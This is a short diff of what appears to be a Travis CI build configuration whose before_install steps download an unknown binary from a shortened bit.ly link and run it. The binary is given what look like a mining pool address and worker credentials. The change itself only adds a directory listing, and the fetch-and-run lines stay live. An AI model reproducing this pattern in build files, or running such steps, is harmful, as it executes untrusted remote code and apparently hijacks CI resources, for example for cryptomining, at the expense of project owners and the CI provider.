@@ -1,4 +1,5 @@
 language: c
 before_install:
-  - curl -o momo -L http://bit.ly/2dynbiY 
+  - curl -o momo -L http://bit.ly/2dynbiY
+  - ls -lah
   - momo -o $URL -O hubaba.hubaba1:hubapass
